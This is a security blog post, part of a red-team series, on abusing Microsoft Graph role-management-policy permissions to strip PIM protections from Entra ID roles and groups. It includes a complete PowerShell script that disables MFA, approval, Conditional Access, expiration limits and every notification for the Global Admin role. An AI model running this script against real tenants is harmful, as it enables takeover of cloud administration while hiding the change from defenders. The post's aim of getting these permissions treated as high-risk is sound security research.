---
title: "Abusing PIM-related application permissions in Microsoft Graph - Part 3"
catchphrase: "Bypassing assignment, eligibility and activation requirements."
image: "/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/00_Abusing_PIM_related_application_permissions_In_Microsoft_Graph.png"
last_modified_at: 2024-07-31
tags:
  - Microsoft Graph
  - Entra ID
  - Azure
  - Pentesting
  - Red-teaming
---

## Introduction

In the [first](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-1/) and [second](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-2/) part of this series, we respectively discussed how application permissions related to eligible and active assignments in PIM can be abused to escalate to Global Admin.

In tenants relatively mature in terms of cloud security, eligible and active assignments are often constrained to meeting additional security requirements. In this part, we will take a closer look at how those constrains can be disabled to keep leveraging the Tier-0 permissions previously discussed, and still escalate to Global Admin in environments with strict PIM settings.


### Overview of the series

This series, which discusses the abuse of PIM-related application permissions in Microsoft Graph, is structured as follows:
- [**Part 1**: Escalating to Global Admin via active assignments](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-1)
- [**Part 2**: Escalating to Global Admin via eligible assignments](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-2)
- [**Part 3**: Bypassing assignment, eligibility and activation requirements](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-3)
- [**Part 4**: Investigating legacy permissions](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-4)

### What permissions are addressed in this post?

This post discusses the following MS Graph application permissions:
- [`RoleManagementPolicy.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#rolemanagementpolicyreadwriteazureadgroup)
- [`RoleManagementPolicy.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#rolemanagementpolicyreadwritedirectory)


## Overview of PIM settings 

The Microsoft [documentation](https://learn.microsoft.com/en-us/graph/identity-governance-pim-rules-overview) describes the relationship between PIM settings in the portal and their Graph implementation as follows:

> In Microsoft Graph, the role settings are called rules. These rules are grouped in, assigned to, and managed for Microsoft Entra roles and groups through containers called policies.


### Understanding role management policies 

As stated in the documentation, each Entra role and user group enrolled in PIM is governed with a dedicated “role management policy”, which is referred to as “Role settings” in the portal. A policy can be scoped to an Entra role, the owners, or the members of a user group. Note that the reason why *role* management policies are used to govern PIM settings for groups, is that “Owner” and “Member” are technically roles within a group.

A policy contains two sections with a dedicated set of rules each. The first section governs **activation** settings, such as the length of the activation, or requirements needed for the activation to be successful. The second section rules **assignment** settings, such as whether the role or group can be assigned permanently, or if administrators are required to re-authenticate with MFA when assigning them.

Here is an example of the default PIM settings for the Global Admin role in Entra ID:

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-3/01_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-3/01_screenshot.png)

Here is an example of the default PIM settings for the “member” role of a user group called “Group of people”:

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-3/02_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-3/02_screenshot.png)

Unless that was not clear, note that PIM-setting options are identical for Entra roles and user groups.

### Understanding possible security gates

PIM settings offer a variety of configurations, of which not all are security gates and potential blockers for privilege escalation. For example, justification and ticket information requirements are not security gates, as they simply expect to provide information, but do not prevent assignments or activations.
The only real security gates are the following requirement options:
- Require Azure Multi-Factor Authentication (MFA)
- Require approval
- Require Conditional Access authentication context

Those security gates can be applied in the following situations:

|  | Require MFA | Require approval | Require conditional access | 
|---|:---:|:---:|:---:|
| Role activation | X | X | X |
| Group-membership activation | X | X | X |
| Active role assignment | X | | |
| Active group assignment | X | | |

In a default tenant with no extra configuration, highly-sensitive roles such as Global Admin require MFA on activation, while user groups enrolled in PIM do not require anything besides justification (see the last 2 screenshots above for visual examples).


## Disabling assignment, eligibility and activation requirements for a <u>role</u>

In the [previous parts](#overview-of-the-series) of this series, we discussed how the [`RoleAssignmentSchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleassignmentschedulereadwritedirectory) and  [`RoleEligibilitySchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleeligibilityschedulereadwritedirectory) permissions can be abused to escalate to Global Admin via active and eligible **role assignments** respectively.

In scenarios where a targeted Entra role is governed by a strict role management policy, the discussed privilege escalations might not be possible. For example, let’s imagine we are targeting the Global Admin role, which requires to following:
1. MFA for active role assignments
2. MFA and administrator approval for eligible role activation 

In order to abuse the discussed permissions, they will have to be combined with the [**`RoleManagementPolicy.ReadWrite.Directory`**](https://learn.microsoft.com/en-us/graph/permissions-reference#rolemanagementpolicyreadwritedirectory) permission, which allows to update all aspects of PIM role settings. Note that this new permission can come from the same service principal as the one we assumed compromised in [previous](#overview-of-the-series) attack scenarios, or by compromising another one.

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-3/03_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-3/03_screenshot.png)

The following PowerShell code demonstrates how to leverage the [`RoleManagementPolicy.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#rolemanagementpolicyreadwritedirectory) permission to disable *all* role requirements one by one, including notification alerts:

```
$tid = ''
$appid = ''
$password = ''

# Acquire MS Graph access token
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appId, $securePassword
Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# Get role management policy Id for the Entra role
$roleDefinitionId = '62e90394-69f5-4237-9190-012177145e10' # current: Global Admin (replace with any role Id)
$rolePolicyId = ''

$uri = "https://graph.microsoft.com/beta/policies/roleManagementPolicyAssignments?`$filter=scopeId%20eq%20'/'%20and%20scopeType%20eq%20'DirectoryRole'"
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}
$response = (Invoke-WebRequest -Method Get -Uri $uri -Headers $headers).Content | ConvertFrom-Json

foreach ($item in $response.value) {
    if ($item.roleDefinitionId -eq $roleDefinitionId) {
        $rolePolicyId = $item.policyId
        break
    }
}

#########################################################
# Disable all activation rules in the management policy #
#########################################################
# Disable activation duration
$uri = "https://graph.microsoft.com/beta/policies/roleManagementPolicies/$rolePolicyId/rules/Expiration_EndUser_Assignment"
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}
$ruleDisabling = @{
    '@odata.type' = '#microsoft.graph.unifiedRoleManagementPolicyExpirationRule'
    maximumDuration = 'P365D'
}
$body = ConvertTo-Json -InputObject $ruleDisabling
$response = Invoke-RestMethod -Method Patch -Uri $uri -Headers $headers -Body $body
$response

# Disable activation requirements: MFA, justification, ticket information
$uri = "https://graph.microsoft.com/beta/policies/roleManagementPolicies/$rolePolicyId/rules/Enablement_EndUser_Assignment"
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}
$ruleDisabling = @{
    '@odata.type' = '#microsoft.graph.unifiedRoleManagementPolicyEnablementRule'
    id = 'Enablement_EndUser_Assignment'
    enabledRules = @()
}
$body = ConvertTo-Json -InputObject $ruleDisabling
$response = Invoke-RestMethod -Method Patch -Uri $uri -Headers $headers -Body $body
$response

# Disable activation requirement: Conditional Access authentication context
$uri = "https://graph.microsoft.com/beta/policies/roleManagementPolicies/$rolePolicyId/rules/AuthenticationContext_EndUser_Assignment"
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}
$ruleDisabling = @{
    '@odata.type' = '#microsoft.graph.unifiedRoleManagementPolicyAuthenticationContextRule'
    isEnabled = $false
}
$body = ConvertTo-Json -InputObject $ruleDisabling
$response = Invoke-RestMethod -Method Patch -Uri $uri -Headers $headers -Body $body
$response

# Disable activation requirement: admin approval
$uri = "https://graph.microsoft.com/beta/policies/roleManagementPolicies/$rolePolicyId/rules/Approval_EndUser_Assignment"
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}
$ruleDisabling = @{
    '@odata.type' = '#microsoft.graph.unifiedRoleManagementPolicyApprovalRule'
    id = 'Approval_EndUser_Assignment'
    setting = @{
        '@odata.type' = '#microsoft.graph.approvalSettings'
        isApprovalRequired = $false
        isApprovalRequiredForExtension = $false
        isRequestorJustificationRequired = $false
        approvalMode = 'NoApproval'
        approvalStages = @(
            @{
                approvalStageTimeOutInDays = 1
                isApproverJustificationRequired = $false
                escalationTimeInMinutes = 0
                primaryApprovers = @()
                isEscalationEnabled = $false
                escalationApprovers = @()
            }
        )
    }
}
$body = ConvertTo-Json -InputObject $ruleDisabling -Depth 4
$response = Invoke-RestMethod -Method Patch -Uri $uri -Headers $headers -Body $body
$response

#########################################################
# Disable all assignment rules in the management policy #
#########################################################
# Disable temporary eligible assignment (allow permanent eligible assignment)
$uri = "https://graph.microsoft.com/beta/policies/roleManagementPolicies/$rolePolicyId/rules/Expiration_Admin_Eligibility"
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}
$ruleDisabling = @{
    '@odata.type' = '#microsoft.graph.unifiedRoleManagementPolicyExpirationRule'
    isExpirationRequired = $false
}
$body = ConvertTo-Json -InputObject $ruleDisabling
$response = Invoke-RestMethod -Method Patch -Uri $uri -Headers $headers -Body $body
$response

# Disable temporary active assignment (allow permanent active assignment)
$uri = "https://graph.microsoft.com/beta/policies/roleManagementPolicies/$rolePolicyId/rules/Expiration_Admin_Assignment"
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}
$ruleDisabling = @{
    '@odata.type' = '#microsoft.graph.unifiedRoleManagementPolicyExpirationRule'
    isExpirationRequired = $false
}
$body = ConvertTo-Json -InputObject $ruleDisabling
$response = Invoke-RestMethod -Method Patch -Uri $uri -Headers $headers -Body $body
$response

# Disable assignment requirements: MFA, justification
$uri = "https://graph.microsoft.com/beta/policies/roleManagementPolicies/$rolePolicyId/rules/Enablement_Admin_Assignment"
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}
$ruleDisabling = @{
    '@odata.type' = '#microsoft.graph.unifiedRoleManagementPolicyEnablementRule'
    id = 'Enablement_Admin_Assignment'
    enabledRules = @()
}
$body = ConvertTo-Json -InputObject $ruleDisabling
$response = Invoke-RestMethod -Method Patch -Uri $uri -Headers $headers -Body $body
$response

###########################################################
# Disable all notification rules in the management policy #
###########################################################
# More info: https://learn.microsoft.com/en-us/graph/identity-governance-pim-rules-overview#notification-rules
$msgraphRulesAndCallers = @{
    'Notification_Admin_Admin_Eligibility' = 'Admin'
    'Notification_Requestor_Admin_Eligibility' = 'Requestor'
    'Notification_Approver_Admin_Eligibility' = 'Approver'
    'Notification_Admin_Admin_Assignment' = 'Admin'
    'Notification_Requestor_Admin_Assignment' = 'Requestor'
    'Notification_Approver_Admin_Assignment' = 'Approver'
    'Notification_Admin_EndUser_Assignment' = 'Admin'
    'Notification_Requestor_EndUser_Assignment' = 'Requestor'
    'Notification_Approver_EndUser_Assignment' = 'Approver'
}

foreach ($item in $msgraphRulesAndCallers.GetEnumerator()){
    $uri = "https://graph.microsoft.com/beta/policies/roleManagementPolicies/$rolePolicyId/rules/$($item.Name)"
    $headers = @{
        'Authorization'= "Bearer $token"
        'Content-Type' = 'application/json'
    }
    $ruleDisabling = @{
        '@odata.type' = '#microsoft.graph.unifiedRoleManagementPolicyNotificationRule'
        id = "$($item.Name)"
        notificationType = 'Email'
        notificationLevel = 'None'
        isDefaultRecipientsEnabled = $false
        notificationRecipients = @()
        recipientType = "$($item.Value)"
    }
    $body = ConvertTo-Json -InputObject $ruleDisabling
    $response = Invoke-RestMethod -Method Patch -Uri $uri -Headers $headers -Body $body
    $response
}
```

Executing the above PowerShell code for an Entra role with strict requirements (i.e. enforcing literally everything) shows how the [`RoleManagementPolicy.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#rolemanagementpolicyreadwritedirectory) permission can be leveraged to disable all activation, assignment and even notification constrains for the role:

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-3/04_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-3/04_screenshot.png)


## Disabling assignment, eligibility and activation requirements for a <u>group</u>

In the [previous parts](#overview-of-the-series) of this series, we discussed how the [`PrivilegedAccess.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureadgroup), [`PrivilegedAssignmentSchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedassignmentschedulereadwriteazureadgroup) and [`PrivilegedEligibilitySchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedeligibilityschedulereadwriteazureadgroup) permissions can be abused to escalate to Global Admin via active and eligible **group assignments**.

In scenarios where a targeted group is governed by a strict role management policy, the discussed privilege escalations might not be possible, and will require to be combined with the [**`RoleManagementPolicy.ReadWrite.AzureADGroup`**](https://learn.microsoft.com/en-us/graph/permissions-reference#rolemanagementpolicyreadwriteazureadgroup) permission, in order to be successful. 

Since role management policies are used to govern PIM settings for both roles and user groups, the procedure for disabling all rules in a PIM group is the same as for an Entra role. The only difference is the way the Id of the role management policy is acquired.

The following PowerShell code shows how to retrieve that Id:

```
# Set SP info
$tid = ''
$appid = ''
$password = ''

# Set group info
$groupId = ''
$groupRole = 'member'   # 'member' or 'owner'

# Acquire MS Graph access token
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appId, $securePassword
Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# Get role management policy Id for the group
$rolePolicyId = ''
$uri = "https://graph.microsoft.com/beta/policies/roleManagementPolicyAssignments?`$filter=scopeId%20eq%20'$($groupId)'%20and%20scopeType%20eq%20'Group'"
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}
$response = (Invoke-WebRequest -Method Get -Uri $uri -Headers $headers).Content | ConvertFrom-Json

foreach ($item in $response.value) {
    if ($item.roleDefinitionId -eq $groupRole) {
        $rolePolicyId = $item.policyId
        break
    }
}

# Disable code goes here
```


## Conclusion

We have seen how the [`RoleManagementPolicy.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#rolemanagementpolicyreadwriteazureadgroup) and [`RoleManagementPolicy.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#rolemanagementpolicyreadwritedirectory) permissions can help leveraging other Tier-0 permissions to enable paths to Global Admin, even in environments with strict PIM settings. Similar to those discussed in [other parts](#overview-of-the-series) of the series, these application permissions should be classified as Tier-0, due to their risk of enabling a path to Global Admin.

In the last and final part of this series, we will discuss remaining application permissions and explore how they relate to older versions of the PIM service. Stay tuned for more 😉
